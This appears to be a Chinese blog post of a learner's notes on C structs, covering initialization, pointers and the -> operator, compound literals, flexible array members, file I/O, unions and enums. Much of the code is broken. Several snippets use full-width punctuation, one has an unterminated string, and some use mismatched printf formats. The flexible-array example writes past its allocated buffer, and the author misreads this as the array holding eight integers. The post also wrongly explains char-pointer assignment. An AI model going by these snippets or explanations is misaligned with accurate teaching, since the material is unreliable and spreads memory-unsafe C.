<p> 我认为结构这种数据类型为C++奠定了面向对象的基础。这是一种很自由的数据类型，我们甚至可以用指针和结构实现面向对象。  </p>
<ul>
<li><p><strong>关于结构的声明</strong>    </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">name</span>&#123;</span>  </span><br><span class="line">  　type1 a;</span><br><span class="line">  　type2 b;　　</span><br><span class="line">&#125;;       <span class="comment">//注意这里的分号</span></span><br></pre></td></tr></table></figure>
<p>这里的声明并未创建一个实际的数据对象，而是描述了这类对象的元素形式，我们也可以将结构声明称之为模板，因为他勾勒出数据将如何存储。<br>之后我们声明name结构的变量：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">name</span> <span class="title">dyf</span>;</span></span><br></pre></td></tr></table></figure>
<p>当编译器读到这条指令时，它将以name模板为dyf分配内存空间，即使未初始化，该结构的大小也由type1 与 type2 的大小决定。这就意味着结构的大小可能会大于数据集本身，因为系统对数据的对齐要求会导致存储裂缝。<br>再者，我们可以如下声明：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span>  </span><br><span class="line">　　type1 a;  </span><br><span class="line">　　type2 b;　　  </span><br><span class="line">&#125; dyf;</span><br></pre></td></tr></table></figure>
<h2 id="即声明结构与定义结构的过程合二为一，如果要多次使用一个模板我们也可以用typedef。"><a href="#即声明结构与定义结构的过程合二为一，如果要多次使用一个模板我们也可以用typedef。" class="headerlink" title="即声明结构与定义结构的过程合二为一，如果要多次使用一个模板我们也可以用typedef。  "></a>即声明结构与定义结构的过程合二为一，如果要多次使用一个模板我们也可以用typedef。  </h2></li>
</ul>
<ul>
<li><strong>关于结构的初始化</strong>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> &#123;</span>  </span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">  <span class="keyword">int</span>  weight[<span class="number">20</span>];</span><br><span class="line">&#125;;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> <span class="title">math</span>&#123;</span></span><br><span class="line">  <span class="string">"高等数学"</span>，</span><br><span class="line">  <span class="number">20</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>非指定初始化应当保持初始化项目与结构成员类型一一对应。<br>而指定初始化则类似于数组：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> <span class="title">dyf</span>&#123;</span></span><br><span class="line">  .name=<span class="string">"高等数学"</span>,</span><br><span class="line">  .weight=<span class="number">10</span>      </span><br><span class="line">&#125;；</span><br></pre></td></tr></table></figure>
<p>其中的.name类似于数组的下标，寻址自然与数组类似。  </p>
<hr>
<ul>
<li><strong>关于结构数组的声明</strong>  </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> <span class="title">library</span>[20];</span></span><br><span class="line">library[<span class="number">2</span>].name=<span class="string">"高等数学"</span>;  <span class="comment">//代表library的第三个元素的那么成员</span></span><br></pre></td></tr></table></figure>
<p>此时，[2]是library的下标，应当注意区别：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">library[<span class="number">2</span>].name;</span><br><span class="line">library.name[<span class="number">2</span>];</span><br></pre></td></tr></table></figure></p>
<p>后者指的是library的第一个成员的name的第三个字符。  </p>
<hr>
<ul>
<li><strong>关于嵌套结构</strong>  </li>
</ul>
<p>有时候我们会在一个结构中嵌套另一个结构例如：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">name</span>&#123;</span> </span><br><span class="line">  <span class="keyword">char</span> firstname[<span class="number">20</span>];</span><br><span class="line">  <span class="keyword">char</span> lastname[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">name</span> <span class="title">dyf</span>;</span></span><br><span class="line">  <span class="keyword">int</span> age;</span><br><span class="line">  <span class="keyword">int</span> height;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>只需在外层结构中声明即可，同理，使用两次点运算符进行访问：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person.dyf.name=<span class="string">"dyf"</span>;</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li><strong>指向结构的指针</strong><br>我们可以通过指针来传递并访问结构，这种操作非常舒服。  </li>
<li>声明与初始化指针： </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">name</span> <span class="title">dyf</span>;</span></span><br><span class="line">  <span class="keyword">int</span> age;</span><br><span class="line">  <span class="keyword">int</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> * <span class="title">p</span>;</span>    <span class="comment">//定义一个只想person结构类型的指针p</span></span><br><span class="line"></span><br><span class="line">p = &amp;dyf;    <span class="comment">//将dyf的地址赋值给指针p</span></span><br></pre></td></tr></table></figure>
<p>p指针在被定义后只能指向person的结构类型，储存person结构的地址。<br>与数组不同的是，结构的名并不代表首个成员的地址，因此必须使用&amp;操作符。  </p>
<ul>
<li><strong>指向结构的指针</strong>  </li>
</ul>
<p>我们可以通过指针来传递并访问结构，这种操作非常舒服。  </p>
<ul>
<li>声明与初始化指针： </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">name</span> <span class="title">dyf</span>;</span></span><br><span class="line">  <span class="keyword">int</span> age;</span><br><span class="line">  <span class="keyword">int</span> height;</span><br><span class="line">&#125;;</span><br><span class="line">     </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> * <span class="title">p</span>;</span>    <span class="comment">//定义一个指向person结构类型的指针p</span></span><br><span class="line">     </span><br><span class="line">p = &amp;dyf;    <span class="comment">//将dyf的地址赋值给指针p  </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> * <span class="title">m</span>;</span></span><br><span class="line">m = &amp;library[<span class="number">2</span>];    <span class="comment">//同理，结构数组内的结构如图赋值</span></span><br></pre></td></tr></table></figure>
<p>p指针在被定义后只能指向person的结构类型，储存person结构的地址。<br>与数组不同的是，结构的名并不代表首个成员的地址，因此必须使用&amp;操作符。  </p>
<ul>
<li><p>使用指针访问成员：<br>此时我们可以引入一个新的运算符”-&gt;”。例如：  </p>
   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">m-&gt;name == library[<span class="number">2</span>].name;</span><br><span class="line"></span><br><span class="line">m == &amp;library[<span class="number">2</span>];  <span class="comment">//m存的地址即为library[2]的地址</span></span><br><span class="line">     </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,m-&gt;name);   <span class="comment">//打印library[2].name 即高等数学</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>m -&gt; value 此操作符意味着取m地址中存的结构的成员，即：  </p>
<pre><code><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m -&gt; value.name == (*m).name == library[<span class="number">2</span>].name;</span><br></pre></td></tr></table></figure>

 注意：`&apos; * &apos;` 的运算级大于` &apos; . &apos;`　使用时注意加()  
</code></pre><hr>
<ul>
<li><strong>向函数传递结构</strong>  </li>
</ul>
<p>只要结构具有单个值的数据类型，即：int及其相关类型、char、float、double、指针等，就可以把它作为一个参数传递给函数，如：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">name</span>&#123;</span></span><br><span class="line">  <span class="keyword">char</span> firstname[<span class="number">20</span>];</span><br><span class="line">  <span class="keyword">char</span> lastname[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">name</span> <span class="title">myname</span>;</span></span><br><span class="line">  <span class="keyword">int</span> age;</span><br><span class="line">  <span class="keyword">int</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getInfo</span><span class="params">(struct person * p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outIbfo</span><span class="params">(struct person * p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123; </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">person</span> <span class="title">dyf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">person</span> * <span class="title">p</span>;</span></span><br><span class="line">  p = &amp;dyf;</span><br><span class="line">  getInfo(p);</span><br><span class="line">  outInfo(p);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getInfo</span><span class="params">(struct person * p)</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please enter your firstname\n"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;((*p).myname.firstname));        <span class="comment">//注意理解这里</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please enter your last name\n"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;((p-&gt;myname).lastname));         <span class="comment">//注意理解这里</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please enter your age\n"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;(p-&gt;age));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please enter your height\n"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;(p-&gt;height));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outInfo</span><span class="params">(struct person * p)</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nname\t);</span></span><br><span class="line"><span class="string">  printf("</span>%s %s\n<span class="string">",(p-&gt;myname).firstname,(p-&gt;myname).lastname);</span></span><br><span class="line"><span class="string">  printf("</span>age   %d\n<span class="string">",p-&gt;age);</span></span><br><span class="line"><span class="string">  printf("</span>height    %d\n<span class="string">",p-&gt;height);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>以上是利用指针来传递结构参数，应当深刻理解’-&gt;’的意义。  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;dyf;    <span class="comment">//这仅仅是获得dyf变量的名而不是其地址  等价于(*dyf)</span></span><br></pre></td></tr></table></figure>
<p>但<code>scanf()</code>需要传递给地址，因此我们需要使用&amp;操作符。如果你理解了以上两种寻址方式，那么你对-&gt;的理解算是合格了。但距离用结构和指针实现面向对象还有一定距离。顺便说一句，我们通常用结构和指针实现队列的数据结构，好好理解指针吧。  </p>
<p>当然除了以上这种用指针传递参数的方式，我们还可以直接用结构的名传递参数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">yourmark</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> math;</span><br><span class="line">  <span class="keyword">int</span> English;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">mark</span><span class="params">(struct yourmark mark )</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> mark.math + mark.English;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这种传参方式很自然也很好理解，但是这毕竟只是赋值给形参，因此如果想改变元数据，我们依旧要使用指针。  </p>
<p>  如果要返回struct则：<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">yourmark</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> math;</span><br><span class="line">  <span class="keyword">int</span> English;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">struct yourmark <span class="title">getmark</span><span class="params">(struct yourmark mark)</span></span>&#123;      <span class="comment">// 此处的返回类型为yourmark结构类型</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please enter your math mark and English mark\n"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;(mark.math),&amp;(mark.English));</span><br><span class="line">  <span class="keyword">return</span> mark</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct yourmark mark;</span><br><span class="line">mark = getmark(mark);   <span class="comment">// 注意，给结构赋值时直接用其名而不是其地址</span></span><br></pre></td></tr></table></figure></p>
<p>  同理，要返回指针只需要<code>struct yourmark * mark getmark(struct yourmark mark)</code></p>
<p>好了到这里，把结构在函数里传来传去已经差不多说完了。  </p>
<hr>
<ul>
<li><strong>复合文字和结构</strong> </li>
</ul>
<p>C99引入了一些新的概念，比如变长数组(VLA)、复合文字(compound literal)、指针的兼容性等。  </p>
<p>  复合文字的意思：<br>  假如我要给函数传递参数，我可以传递一个变量也可以传递一个常量，例如：<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">2</span>,b=<span class="number">3</span>;</span><br><span class="line">sum(a,b)==sum(<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure></p>
<p>  但是对于数组或者结构来讲我们之前没有说过常量这个概念，在传递参数时或者向另一结构传递时可能要定义新的变量，很浪费内存。此时，便引入了复合文字这一概念。<br>  声明如下：<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">  <span class="keyword">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> <span class="title">guy</span>;</span>     <span class="comment">//定义一个person结构类型的结构</span></span><br><span class="line"></span><br><span class="line">guy = (struct person)&#123;<span class="string">"dyf"</span>,<span class="number">18</span>&#125;;   <span class="comment">//把复合文字赋值给guy  </span></span><br><span class="line"></span><br><span class="line">outInfo((struct person)&#123;<span class="string">"麂皮"</span>，<span class="number">18</span>&#125;)；  <span class="comment">//将一个匿名结构作为实参传递给函数  </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">class23</span> &#123;</span></span><br><span class="line">  (struct person)&#123;<span class="string">"dyf"</span>,<span class="number">18</span>&#125;;</span><br><span class="line">  (struct person)&#123;<span class="string">"麂皮"</span>，<span class="number">18</span>&#125;;</span><br><span class="line">&#125;;                                    <span class="comment">//将两个匿名结构传递给class23</span></span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------  </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mark</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> math;</span><br><span class="line">  <span class="keyword">int</span> English;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mark</span><span class="params">(struct mark * p)</span></span>;       <span class="comment">//声明一个参数为mark结构的指针的函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d"</span>,mark(&amp;(struct mark )&#123;<span class="number">150</span>，<span class="number">150</span>&#125;))；   <span class="comment">//传递复合文字的地址</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mark</span><span class="params">(struct mark * p)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> p-&gt;math + p-&gt;English；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 注：用G++编译会报错，因为其地址是temporary 而C99版本的GCC是可行的,因为临时具有自动储存时期，而在函数外具有静态储存时期 */</span></span><br></pre></td></tr></table></figure></p>
<p>这是复合文字的大概用法，他能够创建一个匿名常量对象，直接在结构体或者函数中传递的常量。  </p>
<hr>
<ul>
<li><strong>伸缩性数组成员</strong>  </li>
</ul>
<p>C99加入了一个成为伸缩性数组成员(flexible array member)的新特性,该特性允许结构的最后一个成员是一个具有特殊属性的数组结构，<br>该数组的属性之一就是他并不立即存在。创建规则如下：  </p>
<ol>
<li>伸缩性数组成员必须是最后一个成员  </li>
<li>结构中至少有一个其他成员  </li>
<li>像普通数组那样声明，只是长度不定，例：<code>int a[];</code>  </li>
</ol>
<p>如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mark</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> average;</span><br><span class="line">  <span class="keyword">char</span> subjects[]   <span class="comment">//伸缩数组成员</span></span><br><span class="line">&#125;；</span><br></pre></td></tr></table></figure></p>
<p>此时subjects[]并未被创建，系统没有为他分配足够的内存空间。通常我们要使用伸缩数组时，都会为其先分配足够的内存空间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mark</span> * <span class="title">p</span>;</span></span><br><span class="line">p=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct mark) + <span class="number">20</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br></pre></td></tr></table></figure>
<p>这时我们已经有足够的内存来存放一个mark型结构，并且他可以存放一个19个字符的字符串。没错，开辟的内存空间要能存放结构本身和所需大小的数组。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">flex</span>&#123;</span></span><br><span class="line">        <span class="keyword">int</span> age;</span><br><span class="line">        <span class="keyword">char</span> * name;</span><br><span class="line">        <span class="keyword">char</span> * favobook[<span class="number">20</span>];    <span class="comment">//思考一下，他在main()中能直接赋值吗</span></span><br><span class="line">        <span class="keyword">int</span> favonumber[];</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">flex</span> * <span class="title">p</span>;</span></span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct flex)+<span class="number">6</span>* <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    p-&gt;age=<span class="number">18</span>;</span><br><span class="line">    p-&gt;favonumber[<span class="number">7</span>]=<span class="number">1</span>;</span><br><span class="line">    p-&gt;name=<span class="string">"dyf"</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s \t %d \t %d"</span>,p-&gt;name,p-&gt;age,p-&gt;favonumber[<span class="number">7</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们声明里一个指针name，要注意在C语言中，字符串以数组的形式存储，也就是说其变量名实际是个地址，在我们对其进行声明时计算机已经为他在内存中开辟了空间，所以其地址实际上是个常量，即name是个常量。假如我要进行<code>name=&quot;dyf&quot;;</code>操作，编译器将报错。<code>&quot;dyf&quot;</code>的地址很明显与<code>name</code>本身冲突，故不能直接赋值。<br>这里我们看到favonumber能存8个整数，我也不知道为什么，回去查查资料再来修改。</p>
<hr>
<ul>
<li><strong>将结构存到文件中</strong>  </li>
</ul>
<p>结构的整套信息我们称之为记录(record),单个的项目称之为字段(field)，下面，我们来进行讨论。<br>第一种方法，也是最笨拙的方法，使用<code>fprinf()</code>函数，例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> title[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">char</span> author[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">double</span> value;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> <span class="title">math</span>;</span></span><br><span class="line"><span class="built_in">fprintf</span>(books, <span class="string">"%9s %9s %7.2d"</span>,math.title,math.author,math.value);</span><br></pre></td></tr></table></figure>
<p>我们使用<code>%9s</code>来固定输入格式，以便于下一次读取,这里的books是文件流。</p>
<p>第二种方法，我们可以使用fread()和fwrite()以结构大小为单位来进行读写，例如：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fwrite(&amp;math,<span class="keyword">sizeof</span>(struct book),<span class="number">1</span>,books)</span><br></pre></td></tr></table></figure></p>
<p>这时我们将定位到math的地址<code>sizeof(struct book)</code>将返回一块book结构的大小，<code>&#39;1&#39;</code>则告诉函数只需复制一块结构，最后将整个record写入<code>books</code>相关联的文件。同样<code>fread()</code>将record写入<code>&amp;math</code>地址。  </p>
<hr>
<ul>
<li><strong>衍生出的其他数据类型</strong></li>
</ul>
<p>通过对结构体进行封装，C中还有联合又称为共用体(union)、枚举(enumerated type)两种类型。首先，union声明如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> id&#123;</span><br><span class="line">    <span class="keyword">char</span> id_string[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">int</span> id_int;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>假如一个物体的id有可能是整数，也有可能是字符串，那么我们可以用以上操作。<br>union并不是复合结构,这其中的声明的类型只能同时存在一种，也就是说id可以是字符串类型，也可以是int类型。<br>因此，我们可以声明一个union数组来存放不同类型的数据，这样就实现了混合数据类型存储。这种数据类型封装的方法与结构相同，同样支持<code>. -&gt;</code>等运算符，但是其意义却完全不同。<br>其次，枚举类型声明如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">enum</span> subjects &#123;math=,English=<span class="number">2</span>,Chinese,CS&#125;;</span><br><span class="line"><span class="keyword">enum</span> subjects my_favo_subject;</span><br><span class="line"><span class="keyword">for</span>(my_favo_subject=math;my_favo_subject&lt;=CS;my_favo_subject++)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,my_favo_subject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们通常用枚举创建符号常量，例如，<br><code>math，CS</code>是枚举常量，默认为int类型，math是枚举对象的首元素，其默认值为0，这就好比数组的下标，方便我们进行枚举。我们也可以给枚举常量一个指定值，例如上面<code>English=2</code>，那么，其后面的元素依次从2递增。由于枚举类型是一个整数类型，所以我们常将其用于表达式当中，方便进行逻辑判断或者运算。<br><strong>注：</strong><br>C语言支持枚举变量自增，即<code>my_favo_subject++;</code>但是C++不支持，注意代码兼容性。</p>
<hr>
<ul>
<li><strong>用结构实现链表</strong>  </li>
</ul>
<p>dyf is cool.</p>
<hr>
<ul>
<li><strong>用结构实现面向对象</strong>  </li>
</ul>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2018-12-02</span>
          
            
              <span class="post-category"><a href="/categories/python/">python</a></span>
            
